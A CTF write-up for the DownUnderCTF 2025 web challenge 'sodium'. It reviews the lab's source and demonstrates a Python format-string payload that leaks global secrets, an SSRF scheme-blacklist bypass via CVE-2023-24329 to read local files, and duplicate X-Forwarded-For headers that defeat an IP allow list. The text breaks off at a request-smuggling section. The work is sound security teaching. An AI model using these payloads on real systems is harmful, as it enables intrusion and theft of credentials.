# sodium

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
  - [Explore Functionalities](#explore-functionalities)
  - [Source Code Review](#source-code-review)
    - [Service "Public Website"](#service-public-website)
    - [Service "RPC Service"](#service-rpc-service)
        - [Format Stringss](#format-stringss)
    - [Service "Domain Scanner"](#service-domain-scanner)
    - [Bypassing `authorized_ips` allow list](#bypassing-authorized_ips-allow-list)
        - [Unintended: Just Add More `X-Forwarded-For` Headers](#unintended-just-add-more-x-forwarded-for-headers)
        - [Intended: SPILL.TERM HTTP/1.1 Request Smuggling](#intended-spillterm-http11-request-smuggling)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- Contributor: @siunam
- 22 solves / 304 points
- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Background

This one might require a pinch of patience.

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2025/images/Pasted%20image%2020250722154737.png)

## Enumeration

### Explore Functionalities

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2025/images/Pasted%20image%2020250722154845.png)

In here, we can see that this website is a typical commercial website.

After exploring all the pages in the navigation bar, we found nothing interesting and it's all static:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2025/images/Pasted%20image%2020250722155150.png)

Let's read this web application's source code then!

### Source Code Review

In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2025/web/sodium/src.zip):

```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2025/web/sodium)-[2025.07.22|15:52:49(HKT)]
└> file src.zip 
src.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2025/web/sodium)-[2025.07.22|15:52:51(HKT)]
└> unzip src.zip
Archive:  src.zip
   creating: src/
   creating: src/src/
  inflating: src/src/Dockerfile      
   creating: src/src/rpc_service/
  inflating: src/src/rpc_service/server.py  
 extracting: src/src/rpc_service/.env  
  [...]
  inflating: src/src/conf/default.conf  
  inflating: src/src/init.sh         
  inflating: src/docker-compose.yml  
```

After reading the source code a little bit, we can know that:
- It uses reverse proxy [Pound](https://github.com/graygnuorg/pound) to proxy requests to different HTTP servers
- It hosts 3 HTTP servers/services, which are [Nginx](https://nginx.org/), Python [Flask](https://flask.palletsprojects.com/en/stable/) WSGI web application, and a custom [RPC (Remote Procedure Call)](https://en.wikipedia.org/wiki/Remote_procedure_call) service

In `src/src/Dockerfile`, we can see that Pound's version is **4.15**:

```bash
# Configure Pound
WORKDIR /tmp
RUN wget https://github.com/graygnuorg/pound/releases/download/v4.15/pound-4.15.tar.gz && \
    tar -xzf pound-4.15.tar.gz && \
    cd pound* &&\
    ./configure && \
    make && \
    make install && \
    cd .. && rm -rf pound*
```

At the time of this writeup, the latest version is **4.16**, which means version 4.15 might have some vulnerabilities.

If we go to [Pound's version 4.16 GitHub release](https://github.com/graygnuorg/pound/releases/tag/v4.16), we can see this interesting message:

> A bug fixing release. Noteworthy changes:
> [...]
> Reject requests with oversized chunk bodies.
> [...]

This might be useful for us. For now, let's continue reviewing the web application.

Back to the `Dockerfile`, it'll eventually copy Pound's configuration file from `conf/pound.cfg` to `/usr/local/etc/pound.cfg`:

```bash
COPY conf/pound.cfg /usr/local/etc/pound.cfg
```

Let's break down that config file!

First, according to [Pound documentation on `ListenHTTP` section](https://www.gnu.org.ua/software/pound/manual/ListenHTTP.html), this reverse proxy will be listening on all network interfaces on port `80`:

```
[...]
ListenHTTP
    Address 0.0.0.0
    Port    80
End
[...]
```

Then, it defined 3 different [services](https://www.gnu.org.ua/software/pound/manual/Service.html):

```
Service "RPC Service"
    Host "dev.rpc-service.ductf"
    BackEnd
        Address 127.0.0.1
        Port    8081
    End
End

Service "Domain Scanner"
    Host "dev.customer.ductf"
    BackEnd
        Address 127.0.0.1
        Port    5000
    End
End

Service "Public Website"
    Host -re ".*"
    BackEnd
        Address 127.0.0.1
        Port    8080
    End
End
```

In [directive `Host`](https://www.gnu.org.ua/software/pound/manual/Service-Selection-Statements.html#index-Host-1), if the request's `Host` header matches the hostname (case-insensitive), it'll return `true`, which proxies the request to [`BackEnd`](https://www.gnu.org.ua/software/pound/manual/Backend.html). The `BackEnd` syntax is also similar to `ListenHTTP`. Note that many directives could have [flags](https://www.gnu.org.ua/software/pound/manual/Rewrite.html#conditional_002doption). For example, flag `-re` means it's matching the value with a regular expression (regex) pattern.

In short, this Pound config defined 3 different services, which are:
- Service "RPC Service", hosting a custom [RPC (Remote Procedure Call)](https://en.wikipedia.org/wiki/Remote_procedure_call) service on `127.0.0.1` port `8081`. The hostname is `dev.rpc-service.ductf`
- Service "Domain Scanner", hosting a Python [Flask](https://flask.palletsprojects.com/en/stable/) WSGI web application on `127.0.0.1` port `5000`. The hostname is `dev.customer.ductf`.
- Service "Public Website", hosting a [Nginx](https://nginx.org/) HTTP server on `127.0.0.1` port `8080`. The hostname can be anything (regex pattern `.*`).

Hmm... It seems like we are first proxied to the Nginx server. Let's explore that!

#### Service "Public Website"

In `src/src/Dockerfile`, it copies Nginx's config file from `conf/default.conf` to `/etc/nginx/conf.d/default.conf`, as well as copies the `public` directory to `/usr/share/nginx/html/`:

```bash
COPY conf/default.conf /etc/nginx/conf.d/default.conf
COPY public/ /usr/share/nginx/html/
```

In the config file, all requests to the root URL (`/`) will serve files from `/usr/share/nginx/html`:

```nginx
server {
    listen       8080;
    server_name  localhost;

    location / {
        root   /usr/share/nginx/html;
        index  index.html index.htm;
    }

    error_page   500 502 503 504  /50x.html;
    location = /50x.html {
        root   /usr/share/nginx/html;
    }
}
```

Which are the files in the `public` directory:

```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2025/web/sodium/src)-[2025.07.22|16:41:01(HKT)]
└> ls -lah src/public/
total 44K
drwxr-xr-x 2 siunam siunam 4.0K Jul  8 16:31 .
drwxr-xr-x 6 siunam siunam 4.0K Jul  8 19:12 ..
-rw-r--r-- 1 siunam siunam 3.8K Jul  8 16:31 aboutus.html
-rw-r--r-- 1 siunam siunam 3.5K Jul  8 16:31 careers.html
-rw-r--r-- 1 siunam siunam 4.0K Jul  8 16:31 contactus.html
-rw-r--r-- 1 siunam siunam 5.6K Jul  8 16:31 index.html
-rw-r--r-- 1 siunam siunam 3.8K Jul  8 16:31 privacy.html
-rw-r--r-- 1 siunam siunam 4.2K Jul  8 16:31 services.html
-rw-r--r-- 1 siunam siunam 3.8K Jul  8 16:31 terms.html
```

Well... They are just static HTML files. Nothing interesting. Therefore, we can rule out this Nginx server, as it's useless to us.

#### Service "RPC Service"

In `src/src/rpc_service/server.py`, we can see the RPC service's logic.

Right off the bat, we can see that the flag is loaded from the environment variable `FLAG`, in which library [dotenv](https://pypi.org/project/python-dotenv/) parses the `src/src/rpc_service/.env` file:

```python
[...]
import dotenv
import os
[...]
dotenv.load_dotenv("./.env")
[...]
FLAG = os.getenv("FLAG")
```

In the first few lines of this Python script, we can also see this weird comment:

```python
# Proof of concept RPC service using h11 for HTTP/1.1 handling for ticket [TICKET-1337]
# [...]
```

As the comment said, this RPC service uses library [h11](https://pypi.org/project/h11/) to handle different [HTTP/1.1](https://datatracker.ietf.org/doc/html/rfc7230) requests.

Let's read this RPC service's logic!

First, when the script runs, it'll call function `serve`, which creates a new socket and binds on all network interfaces on port `8081`:

```python
import socket
[...]
def serve():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("0.0.0.0", 8081))
    sock.listen(5)
    logger.info("[*] RPC backend listening on port 8081")

    while True:
        [...]

if __name__ == "__main__":
    serve()
```

Then, it'll create an object that encapsulates the state of an HTTP connection (`h11.Connection`). As well as waiting and receiving incoming data:

```python
import h11
[...]
def serve():
    [...]
    while True:
        [...]
        conn_state = h11.Connection(h11.SERVER)
        [...]
        try:
            while True:
                data = conn.recv(4096)
                [...]
                conn_state.receive_data(data)

                while True:
                    [...]
```

Next, if the data is the beginning of an HTTP request (`h11.Request`), it'll call function `handle_request`:

```python
import h11
[...]
def serve():
    [...]
    while True:
        [...]
        try:
            while True:
                [...]
                while True:
                    try:
                        event = conn_state.next_event()
                    except Exception as e:
                        [...]

                    if isinstance(event, h11.Request):
                        handle_request(conn, conn_state, event)
                    [...]
```

Inside this function, it'll first get request header `X-Forwarded-For` and `Auth-Key`'s value:

```python
def handle_request(conn, conn_state, request):
    """Handle incoming requests and route them to the appropriate handler based on the request target."""
    target = request.target.decode()
    headers = {k.decode().lower(): v.decode() for k, v in request.headers}

    # Allowlist check
    forwarded_for = headers.get("x-forwarded-for", "").strip()
    auth_key = headers.get("auth-key")
    [...]
```

Then, it validates those request headers against the `config` object:

```python
import logging
[...]
def handle_request(conn, conn_state, request):
    [...]
    if config.authorized_ips and forwarded_for not in config.authorized_ips:
        logger.warning(f"Blocked access from unauthorized IP: {forwarded_for}")
        body = f"Access denied: You are not allowed:to access this service. Only {', '.join(config.authorized_ips)} are allowed access.".encode()
        body += f". \nThe IP recieved was: {forwarded_for}".encode()
        send_response(conn, conn_state, 403, body)
        return

    # Simple auth check for endpoints that require authentication
    elif auth_key != config.auth_key:
        logger.warning("Unauthorized access attempt to /stats")
        send_response(conn, conn_state, 403, "Unauthorized: Invalid Auth-Key")
        return
    [...]
```

The `config` object is initialized from class `Config`:

```python
class Config:
    def __init__(self):
        self.auth_key = os.getenv('AUTHENTICATION_KEY')
        self.service = 'RPC'
        self.requests = 0
        self.authorized_ips = ["127.0.0.1"]
    [...]

config = Config()
```

Which means request header `X-Forwarded-For`'s value must match to one of the list (array) items in attribute `authorized_ips`, and header `Auth-Key`'s value must be environment variable `AUTHENTICATION_KEY`'s value.

After validating those headers, it'll perform different actions based on the request path (`target`):

```python
def handle_request(conn, conn_state, request):
    [...]
    # /stats endpoint
    if target.startswith("/stats"):
        [...]
        return

    # /ping endpoint
    elif target == "/ping":
        [...]
        return

    # /update_allowlist endpoint, instead of hardcoding IP's manually, just make it easier to update the config on the fly.
    # DB driven in the future
    elif target.startswith("/update_allowlist"):
        [...]
        return

    # TODO: Add more endpoints for internal service management. Final version will act like a control 
    # panel for all the internal services custom built for our needs, possibly could be done using an internal scan
    else:
        [...]
        return
```

In here, it defined 3 different endpoints: `/stats`, `/ping`, and `/update_allowlist`.

Endpoint `/ping` just sends a response back to the client with body `Pong!` and nothing else:

```python
def handle_request(conn, conn_state, request):
    [...]
    elif target == "/ping":
        send_response(conn, conn_state, 200, "Pong!")
        return
    [...]

def send_response(conn, conn_state, status_code, body, content_type="text/plain"):
    """Send a response back to the client."""
    [...]
    response = h11.Response(
        status_code=status_code,
        headers=[
            ("Content-Length", str(len(body))),
            ("Content-Type", content_type),
        ]
    )
    conn.send(conn_state.send(response))
    conn.send(conn_state.send(h11.Data(data=body)))
    conn.send(conn_state.send(h11.EndOfMessage()))
    config.requests += 1
```

In endpoint `/update_allowlist`, it'll append an IP address to the `authorized_ips` list attribute in the `config` object:

```python
def handle_request(conn, conn_state, request):
    [...]
    elif target.startswith("/update_allowlist"):
        ip_address = target.split('=')[-1]
        if ip_address:
            if ip_address not in config.authorized_ips and re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$").findall(ip_address):
                config.authorized_ips.append(ip_address)
                logger.info(f"Added {ip_address} to allowlist.")
                send_response(conn, conn_state, 200, f"IP {ip_address} added to allowlist.")
            else:
                logger.warning(f"IP {ip_address} is already in the allowlist or Invalid Input Provided.")
                send_response(conn, conn_state, 200, f"IP {ip_address} is already allowed.")
        return
    [...]
```

So, if the request path something like `/update_allowlist=1.2.3.4`, it appends `1.2.3.4` to the list.

Hmm... This one may be useful later. Let's keep that in mind.

In endpoint `/stats`, it parses the request's [query string](https://en.wikipedia.org/wiki/Query_string) into a [key value pair](https://en.wikipedia.org/wiki/Name%E2%80%93value_pair), which passes that into function `build_stats_page`. Eventually, the server responses to the client with the return value of that function:

```python
def handle_request(conn, conn_state, request):
    [...]
    if target.startswith("/stats"):
        try:
            params = {}
            for param in re.search(r".*\?(.*)", target).groups()[0].split("&"):
                logger.error(param)
                params[param.split("=")[0]] = bool(param.split("=")[1])
            body = build_stats_page(**params).encode()
        except Exception as e:
            [...]
        send_response(conn, conn_state, 200, body)
        return
    [...]
```

Note that argument `params` will be unpacked via [`**` operator](https://www.geeksforgeeks.org/python/packing-and-unpacking-arguments-in-python/). With that said, we can control any keyword arguments in function `build_stats_page`.

Inside that function, it'll perform a bunch of format string ([`str.format`](https://docs.python.org/3/library/stdtypes.html#str.format)) operations. If keyword argument `get_log` is `True`, it'll format `{logs}` with the return value of function `get_logs`:

```python
def build_stats_page(get_log=False, get_config=True):
    """Provide analytics for the RPC Service, display configurations and display activity logs"""

    # Print logs
    if get_log == True:
        template = """
            <h1>Admin Stats Page</h1>
                {logs}
            """.format(logs=get_logs())
    else:
        template = """
            <h1>Admin Stats Page</h1>
            <p>Page to show logs or Configuration</p>
            """
    [...]
```

In function `get_logs`, it returns and reads file `debug.log`:

```python
def get_logs():
    """If debug logs are requested with for the stats page, can become noisy though"""
    debug_logs = open("debug.log", "r").readlines()
    logs = "\n<h2>Server Debug Logs</h2>"
    logs += "\n".join([line.rstrip() for line in debug_logs])
    return logs
```

If we look at the following [logging](https://docs.python.org/3/library/logging.html) config, we can see that the root logger level is [ERROR](https://docs.python.org/3/library/logging.html#logging.ERROR) if environment variable `ENV` is not `debug`:

```python
ENV = os.getenv("ENV", "production").lower()
LOG_LEVEL = logging.DEBUG if ENV == "debug" else logging.ERROR
LOG_FORMAT = '[%(asctime)s] %(levelname)s: %(message)s' if ENV == "debug" else '[%(asctime)s] %(message)s'
logging.basicConfig(level=LOG_LEVEL, format=LOG_FORMAT, handlers=[ logging.FileHandler("debug.log"), logging.StreamHandler()])
```

Which means only function call [`logging.error`](https://docs.python.org/3/library/logging.html#logging.error) and [`logging.critical`](https://docs.python.org/3/library/logging.html#logging.critical) will show the logging messages:

```python
import logging

logging.basicConfig(level=logging.ERROR)

logging.debug('log debug')
logging.info('log info')
logging.warning('log warning')
logging.error('log error')
logging.critical('log critical')
```

```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2025/web/sodium/src)-[2025.07.22|18:36:02(HKT)]
└> python3 log_test.py
ERROR:root:log error
CRITICAL:root:log critical
```

Also, it sets the [`handlers`](https://docs.python.org/3/library/logging.html#logging.basicConfig) to [`FileHandler`](https://docs.python.org/3/library/logging.handlers.html#logging.FileHandler) and [StreamHandler](https://docs.python.org/3/library/logging.handlers.html#logging.StreamHandler), so that **every log will be appended to file `debug.log`**.

Therefore, function `get_logs` will return all logs that are in `ERROR` and `CRITICAL` level.

After getting all the logs, if keyword argument `get_config` is `True`, it'll append `{config}` into the template string. Otherwise, it'll just append `{config.service}`:

```python
def build_stats_page(get_log=False, get_config=True):
    [...]
    # Full config
    if get_config == True:
        template += """
                    <h2>Current Configuration</h2>
                    {config}
                    """
    else:
        template += """<p>{config.service} service health ok</p>"""

    template += "<p>Administrative Interface for RPC Server</p>"
    [...]
```

Finally, the function will log the template string in `ERROR` level and perform one final format string operation:

```python
def build_stats_page(get_log=False, get_config=True):
    [...]
    logger.error(template)
    return template.format(config=config)
```

Note that if `get_config` is `True`, it'll format the `config` object as a string, and the string will be the return value of the following [magic method `__repr__`](https://docs.python.org/3/reference/datamodel.html#object.__repr__):

```python
class Config:
    [...]
    def __repr__(self):
        joined_ips = '</br>\n'.join(self.authorized_ips)
        repr_message = f"\nCurrent Server Time: {datetime.datetime.now().strftime('%Y %M %d %T')}"
        repr_message += f"\n</br>Authorized IPs:</br>{joined_ips}"
        repr_message += f"\n</br>Authentication Token: {self.auth_key[0:8]}..."
        repr_message += f"\n</br>Requests served: {self.requests}"
        return repr_message
```

Hmm... Can we control the error/critical logging messages?

##### Format Stringss

In the server Python script, it doesn't have any `logging.critical` function calls but `logging.error`. One function call sticks out the most:

```python
def handle_request(conn, conn_state, request):
    [...]
    if target.startswith("/stats"):
        try:
            params = {}
            for param in re.search(r".*\?(.*)", target).groups()[0].split("&"):
                logger.error(param)
                [...]
            [...]
        except Exception as e:
            [...]
        [...]
    [...]
```

In here, it'll log out every single parsed query parameter! Which means we can control the logging message. Therefore, endpoint `/stats` is vulnerable to **format string vulnerability**!

To do so, we can first inject the log with our own format string payload. Then, in the final `template.format` function call, it'll format our payload:

```python
class Config:
    def __init__(self):
        self.auth_key = 'foo'

    def __repr__(self):
        return 'message'

config = Config()
payload = '{config.auth_key}'

template = """
<h1>Admin Stats Page</h1>
    {logs}
""".format(logs=payload)
print(f'First format string operation: {template}')

print(f'Second format string operation: {template.format(config=config)}')
```

```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2025/web/sodium/src)-[2025.07.22|19:14:21(HKT)]
└> python3 format_str.py
First format string operation: 
<h1>Admin Stats Page</h1>
    {config.auth_key}

Second format string operation: 
<h1>Admin Stats Page</h1>
    foo

```

Since we can control the format string, we can leverage this vulnerability to leak something important!

Because the flag is defined in the global scope:

```python
FLAG = os.getenv("FLAG")
```

We can use [`__globals__`](https://docs.python.org/3/reference/datamodel.html#function.__globals__) to reading all global variables:

```python
import os

class Config:
    def __init__(self):
        self.auth_key = 'foo'

    def __repr__(self):
        return 'message'

FLAG = os.getenv("FLAG")
config = Config()
payload = '{config.__init__.__globals__}'

template = """
<h1>Admin Stats Page</h1>
    {logs}
""".format(logs=payload)
print(f'First format string operation: {template}')

print(f'Second format string operation: {template.format(config=config)}')
```

```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2025/web/sodium/src)-[2025.07.22|19:20:41(HKT)]
└> FLAG=DUCTF{TEST_FLAG} python3 format_str.py
First format string operation: 
<h1>Admin Stats Page</h1>
    {config.__init__.__globals__}

Second format string operation: 
<h1>Admin Stats Page</h1>
    {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f1b798bf8d0>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/home/siunam/ctf/DownUnderCTF-2025/web/sodium/src/format_str.py', '__cached__': None, 'os': <module 'os' (frozen)>, 'Config': <class '__main__.Config'>, 'FLAG': 'DUCTF{TEST_FLAG}', 'config': message, 'payload': '{config.__init__.__globals__}', 'template': '\n<h1>Admin Stats Page</h1>\n    {config.__init__.__globals__}\n'}

```

We can also use payload `{config.__init__.__globals__[FLAG]}` for cleaner output:

```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2025/web/sodium/src)-[2025.07.22|19:20:43(HKT)]
└> FLAG=DUCTF{TEST_FLAG} python3 format_str.py
First format string operation: 
<h1>Admin Stats Page</h1>
    {config.__init__.__globals__[FLAG]}

Second format string operation: 
<h1>Admin Stats Page</h1>
    DUCTF{TEST_FLAG}

```

Now that we know the RPC service has a format string vulnerability that allows us to read the flag, let's try to pass both `X-Forwarded-For` and `Auth-Key` request header checks!

Let's look at the `Auth-Key` first, the correct value is stored in environment variable `AUTHENTICATION_KEY`:

```python
class Config:
    def __init__(self):
        self.auth_key = os.getenv('AUTHENTICATION_KEY')
        [...]
```

#### Service "Domain Scanner"

If we search for that variable, we'll find that the Python Flask web application has that, and it's in `src/src/customer_app/app/routes.py`:

```python
import os
[...]
AUTHENTICATION_KEY = os.environ.get('AUTHENTICATION_KEY')
```

However, this `AUTHENTICATION_KEY` is never used.

In POST route `/`, it'll send a GET request to a URL using [`urlopen`](https://docs.python.org/3/library/urllib.request.html#urllib.request.urlopen) from [urllib.request](https://docs.python.org/3/library/urllib.request.html). The URL is from our POST parameter `url`:

```python
from urllib.request import urlopen
[...]
@main.route('/', methods=['GET', 'POST'])
def index():
    [...]
    if request.method == 'POST':
        url = request.form.get('url', '')
        [...]
        if not is_safe_url(url):
            logger.warning(f"[!] Unsafe URL detected: {url}")
            return render_template("result.html", domain=url, result="Blocked by blacklist.")
        # TODO: Extract information from the domain, and check if they are with us.
        try:
            preview = urlopen(url).read().decode('utf-8', errors='ignore')
            [...]
        except Exception as e:
            [...]
        [...]
```

After that, it'll render the response body in template `result.html`:

```python
from urllib.request import urlopen
[...]
@main.route('/', methods=['GET', 'POST'])
def index():
    [...]
    if request.method == 'POST':
        try:
            preview = urlopen(url).read().decode('utf-8', errors='ignore')
            [...]
            result = f"Website Responds with: <br><pre>{preview}</pre>"
        except Exception as e:
            [...]
        [...]
        return render_template("result.html", domain=url, result=result, scan=scan)
```

`result.html`:

```html
{% block content %}
    [...]
    {% if result %}
        [...]
        <td>{{ result }}</td>
        [...]
    {% else %}
        [...]
    {% endif %}
{% endblock %}
```

Therefore, the response body will be displayed/reflected in the template.

But before it opens our given URL, it'll first call function `is_safe_url` to validate the URL:

```python
from urllib.parse import urlparse
[...]
BLACKLIST = ['file', 'gopher', 'dict']
[...]
def is_safe_url(url):
    scheme = urlparse(url).scheme
    if scheme in BLACKLIST:
        logger.warning(f"[!] Blocked by blacklist: scheme = {scheme}")
        flash("BAD URL: The URL scheme is not allowed.", "danger")
        return False
    return True
```

After parsing our URL by calling function [`urlparse`](https://docs.python.org/3/library/urllib.parse.html#urllib.parse.urlparse), it'll check the [URL scheme](https://datatracker.ietf.org/doc/html/rfc1738#section-2.1) is not `file`, `gopher`, or `dict`.

According to `urllib.parse` documentation, section [URL parsing security](https://docs.python.org/3/library/urllib.parse.html#url-parsing-security), it said:
> The [`urlsplit()`](https://docs.python.org/3/library/urllib.parse.html#urllib.parse.urlsplit "urllib.parse.urlsplit") and [`urlparse()`](https://docs.python.org/3/library/urllib.parse.html#urllib.parse.urlparse "urllib.parse.urlparse") APIs do not perform **validation** of inputs. They may not raise errors on inputs that other applications consider invalid. They may also succeed on some inputs that might not be considered URLs elsewhere. Their purpose is for practical functionality rather than purity.
> 
> Instead of raising an exception on unusual input, they may instead return some component parts as empty strings. Or components may contain more than perhaps they should.

Hmm... Can we bypass the blacklist?

If we Google "python urllib.parse.urlparse bypass", we will find this blog post: [CVE-2023-24329 Bypassing URL Blackslisting using Blank in Python urllib library](https://www.vicarius.io/vsociety/posts/cve-2023-24329-bypassing-url-blackslisting-using-blank-in-python-urllib-library-4).

TL;DR: In Python version prior to **3.11.4**, `urllib.parse.urlparse` function will **return empty scheme and hostname (`netloc`)** if the **URL schema starts with a space character**:

```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2025/web/sodium/src)-[2025.07.22|19:42:36(HKT)]
└> python3   
Python 3.11.3 (main, May 23 2023, 13:25:46) [GCC 10.2.1 20210110] on linux
[...]
>>> import urllib.parse
>>> 
>>> urllib.parse.urlparse('file:///etc/passwd')
ParseResult(scheme='file', netloc='', path='/etc/passwd', params='', query='', fragment='')
>>> urllib.parse.urlparse(' file:///etc/passwd')
ParseResult(scheme='', netloc='', path=' file:///etc/passwd', params='', query='', fragment='')
```

If we look at the `src/src/Dockerfile`, the Docker image is [python:3.11.3-bullseye](https://hub.docker.com/layers/library/python/3.11.3-bullseye/images/sha256-9c88ce9c15d69674c0d5da21e6ba45d91cd12010e92825ef0e60e5184c9453ad):

```bash
FROM python:3.11.3-bullseye
```

As the tag name suggested, the Python version is 3.11.3, which is **vulnerable to CVE-2023-24329**!

Therefore, we can bypass the blacklist to perform SSRF (Server-Side Request Forgery) to read arbitrary local files by using the [`file://` URL scheme](https://en.wikipedia.org/wiki/File_URI_scheme)!

What file should we read? Well, since the `Dockerfile` copies this service's files into path from `customer_app/` to `/home/customerapp/customer_app/`, and the environment variable file also exists in path `customer_app/.env`, we can just read that `.env` file.

> Note: We could also read `/proc/self/environ` to read the Flask web application's process environment variables. However, for some unknown reasons, no process related to user `customerapp` has that `AUTHENTICATION_KEY` environment variable.

Wait a minute... Can't we just read the `.env` file in the RPC service?

```bash
RUN useradd -m customerapp && useradd -m rpcservice && \
    mkdir -p /home/customerapp/ && \
    mkdir -p /home/rpcservice/
[...]
COPY public/ /usr/share/nginx/html/
COPY rpc_service/ /home/rpcservice/rpc_service/
COPY customer_app/ /home/customerapp/customer_app/
# Configure directory permissions
RUN chmod -R 700 /home/rpcservice/ && \
    chown -R customerapp:customerapp /home/customerapp/ && \
    chown -R rpcservice:rpcservice /home/rpcservice/
```

Well... Both services are owned by different users: `customerapp` and `rpcservice`.

And in `src/src/init.sh`, it'll start both services with the correct user:

```bash
# Start the RPC backend as the correct user
su - rpcservice -c "cd /home/rpcservice/rpc_service && /usr/local/bin/python3 server.py &"

# Start customer app
su - customerapp -c "cd /home/customerapp/customer_app && /usr/local/bin/python3 run.py"
```

Damn, so we can't leverage the SSRF vulnerability to read the RPC service's `.env` file.

Anyway, we can now leak the `AUTHENTICATION_KEY` environment variable, right?

```python
@main.route('/', methods=['GET', 'POST'])
def index():
    if 'user_id' not in session:
        logger.info(session)
        return redirect(url_for('auth.login'))
    [...]
```

Well unless we're authenticated... But don't worry, we can just register and login a new account with the following requests:

```http
POST /register HTTP/1.1
Host: dev.customer.ductf
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

username=siunam&password=password
```

```http
POST /login HTTP/1.1
Host: dev.customer.ductf
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

username=siunam&password=password
```

Let's try to test this SSRF to arbitrary file read vulnerability in our own local testing environment!

```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2025/web/sodium/src)-[2025.07.22|20:20:05(HKT)]
└> docker compose up --build                      
[...]
[+] Running 3/3
 ✔ challenge                  Built                                                                  0.0s 
 ✔ Network src_default        Created                                                                0.0s 
 ✔ Container src-challenge-1  Created                                                                0.0s 
[...]
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2025/images/Pasted%20image%2020250722202056.png)

Nice! It worked!

#### Bypassing `authorized_ips` allow list

Now we have one thing left in order to exploit the format string vulnerability: the `authorized_ips` list attribute in object `config`.

##### Unintended: Just Add More `X-Forwarded-For` Headers

When we send a request to host `dev.rpc-service.ductf`, it'll return 1 received IP:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2025/images/Pasted%20image%2020250722203453.png)

Despite we didn't provide any `X-Forwarded-For` header, the reverse proxy, Pound, **[rewrote our request](https://github.com/graygnuorg/pound?tab=readme-ov-file#request-modification)** and added the `X-Forwarded-For` header.

By default, Pound adds the `forwarded` headers to the original request:
- `X-Forwarded-For:` header passes the actual IP address of the client machine that sent the request.
- `X-Forwarded-Proto:` header contains the original protocol (`http` or `https`).
- `X-Forwarded-Port:` header contains the port on the server that the client connected to.

We can also confirm this in Pound's source code:

[`src/http.c` line 3183 - 3238](https://github.com/graygnuorg/pound/blob/a10ab292c12667374a24c0215d0eabee4138eb51/src/http.c#L3183-L3238):

```c
static int
add_forwarded_headers (POUND_HTTP *phttp)
{
  [...]
  stringbuf_printf (&sb, "X-Forwarded-For: %s",
            addr2str (caddr, sizeof (caddr), &phttp->from_host, 1));
  if ((str = stringbuf_finish (&sb)) == NULL
      || http_header_list_append (&phttp->request.headers, str, H_APPEND))
    {
      stringbuf_free (&sb);
      return -1;
    }
  [...]
```

Now, what will happen if we add a `X-Forwarded-For` header in our request?

```http
GET /ping HTTP/1.1
Host: dev.rpc-service.ductf
Auth-Key: fake_token
X-Forwarded-For: 127.0.0.1


```

Response: 

```http
HTTP/1.1 403 
Content-Length: 138
Content-Type: text/plain

Access denied: You are not allowed:to access this service. Only 127.0.0.1 are allowed access.. 
The IP recieved was: 127.0.0.1, 172.18.0.1
```

Huh, now the received IP is string `127.0.0.1, 172.18.0.1`. Why?

According to [RFC 9110 section 5.2](https://www.rfc-editor.org/rfc/rfc9110.html#section-5.2), header field's value can be combined with a comma (`,`) character, such as:

```http
X-Forwarded-For: 127.0.0.1, 1.2.3.4
```

As expected, Pound followed the RFC and implemented the combined field value [`src/log.c` line 257 - 298](https://github.com/graygnuorg/pound/blob/a10ab292c12667374a24c0215d0eabee4138eb51/src/log.c#L257-L298):

```c
void
save_forwarded_header (POUND_HTTP *phttp)
{
  [...]
  hname = get_forwarded_header_name (phttp);
  if ((hdr = http_header_list_locate_name (&phttp->request.headers,
                       hname, strlen (hname))) != NULL)
    {
      if (is_combinable_header (hdr))
    {
      if ((val = http_header_get_value (hdr)) != NULL)
        phttp->orig_forwarded_header = xstrdup (val);
    }
  [...]
```

If the `X-Forwarded-For` header is found and is combinable (as determined by `is_combinable_header`, and headers are defined in [`src/mvh.inc`](https://github.com/graygnuorg/pound/blob/a10ab292c12667374a24c0215d0eabee4138eb51/src/mvh.inc)), the value of the header is obtained using `http_header_get_value` and copied to `orig_forwarded_header` after duplicating it with `xstrdup`.

Now, what will happen if we add another `X-Forwarded-For` header? It should be combined as `X-Forwarded-For: <IP_1>, <IP_2>, <IP_3>`, right?

```http
GET /ping HTTP/1.1
Host: dev.rpc-service.ductf
Auth-Key: fake_token
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 1.2.3.4


```

```http
HTTP/1.1 403 
Content-Length: 124
Content-Type: text/plain

Access denied: You are not allowed:to access this service. Only 127.0.0.1 are allowed access.. 
The IP recieved was: 1.2.3.4
```

Wait what? Now the received IP is our last forwarded header!

I couldn't find out why. My theory is that if the header is combinable, the value of the last occurrence of the header would be saved.

With that said, we can bypass the `authorized_ips` check!

```http
GET /ping HTTP/1.1
Host: dev.rpc-service.ductf
Auth-Key: fake_token
X-Forwarded-For: 1.2.3.4
X-Forwarded-For: 127.0.0.1


```

```http
HTTP/1.1 200 
Content-Length: 5
Content-Type: text/plain

Pong!
```

##### Intended: SPILL.TERM HTTP/1.1 Request Smuggling

Since Pound version 4.16's release note has an interesting change ("Reject requests with oversized chunk bodies."), maybe we can abuse that to bypass the `authorized_ips` check.
